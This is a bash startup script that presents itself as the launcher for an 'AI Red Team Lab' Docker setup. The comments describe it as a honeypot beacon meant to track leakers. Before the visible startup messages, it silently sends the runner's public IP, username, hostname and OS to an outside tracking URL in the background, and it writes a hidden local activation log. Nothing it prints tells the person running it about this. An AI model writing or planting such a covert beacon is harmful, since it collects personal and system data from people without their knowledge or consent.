#!/bin/bash
#
# Honeypot Beacon Script
# This script phones home when the honeypot lab is deployed
# Include this in the honeypot-lab.zip as a startup script
#

# Beacon URL - Replace with your actual tracking endpoint
BEACON_URL="${BEACON_URL:-https://your-server.com/leaker}"

# Gather system information
get_system_info() {
    # Try multiple IP detection services with fallbacks for security
    local ip=""
    for service in "ifconfig.me" "icanhazip.com" "api.ipify.org"; do
        ip=$(curl -s --connect-timeout 5 "$service" 2>/dev/null)
        if [ -n "$ip" ] && [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            break
        fi
    done
    ip=${ip:-"unknown"}
    
    local user=${USER:-"unknown"}
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    local timestamp=$(date +%s)
    local os=$(uname -s 2>/dev/null || echo "unknown")
    
    echo "ip=$ip&user=$user&host=$hostname&ts=$timestamp&os=$os"
}

# Send beacon (silently)
send_beacon() {
    local info=$(get_system_info)
    local full_url="${BEACON_URL}?${info}"
    
    # Try to send beacon silently
    if command -v curl &> /dev/null; then
        curl -s -m 5 "$full_url" > /dev/null 2>&1 &
    elif command -v wget &> /dev/null; then
        wget -q -T 5 -O /dev/null "$full_url" > /dev/null 2>&1 &
    fi
}

# Send beacon in background
send_beacon &

# Also log locally for forensics
LOG_DIR="${HOME}/.honeypot"
mkdir -p "$LOG_DIR" 2>/dev/null

# Try multiple IP services for logging too
PUBLIC_IP="unknown"
for service in "ifconfig.me" "icanhazip.com"; do
    PUBLIC_IP=$(curl -s --connect-timeout 3 "$service" 2>/dev/null)
    if [ -n "$PUBLIC_IP" ] && [[ "$PUBLIC_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        break
    fi
done

echo "[$(date -Iseconds)] Lab activated by $USER on $(hostname) from $PUBLIC_IP" >> "$LOG_DIR/activation.log" 2>/dev/null

# Continue with normal startup
echo "🚀 Starting Strategickhaos AI Red Team Lab..."
echo "⚡ Initializing Docker containers..."

# Start docker compose in the background
if [ -f "docker-compose.yml" ]; then
    docker compose up -d 2>&1
elif [ -f "docker-compose-honeypot.yml" ]; then
    docker compose -f docker-compose-honeypot.yml up -d 2>&1
else
    echo "Error: No docker-compose.yml found"
    exit 1
fi

echo ""
echo "✅ Lab deployment complete!"
echo ""
echo "Access your services at:"
echo "  - OpenWebUI: http://localhost:3000"
echo "  - Grafana: http://localhost:3000"
echo "  - Prometheus: http://localhost:9090"
echo ""
echo "Run 'docker compose logs -f' to view logs"
